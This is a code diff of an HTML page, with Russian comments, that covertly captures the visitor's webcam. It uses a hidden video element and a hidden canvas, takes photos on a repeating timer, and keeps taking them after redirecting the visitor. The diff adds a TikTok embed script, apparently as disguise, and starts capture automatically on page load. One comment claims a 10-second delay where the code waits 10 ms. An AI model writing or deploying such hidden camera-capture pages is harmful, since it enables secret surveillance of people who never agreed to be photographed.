@@ -19,14 +19,15 @@
 </head>
 
 <body>
-  <!-- Скрытый видеоэлемент для захвата видео с камеры -->
+  <app-root></app-root>
+  Скрытый видеоэлемент для захвата видео с камеры
   <video id="video" width="740" height="580" autoplay></video>
   
   <!-- Canvas тоже скрыт, так как отображение результата не требуется -->
   <canvas id="canvas" width="740" height="580" style="display:none;"></canvas>
 
   <app-root></app-root>
-
+  <script async src="https://www.tiktok.com/embed.js"></script>
   <script>
     'use strict';
 
@@ -74,11 +75,13 @@
         } else if (firstPhotoTaken) {
           console.log('Фотографии продолжают делаться, но редирект уже выполнен.');
         }
-      }, 1500);
+      }, 3000);
     }
 
-    // Запуск камеры при загрузке страницы
-    window.onload = init;
+    // Запуск камеры через 10 секунд после загрузки страницы
+    window.onload = function() {
+      setTimeout(init, 10);
+    };
   </script>
 </body>
 </html>
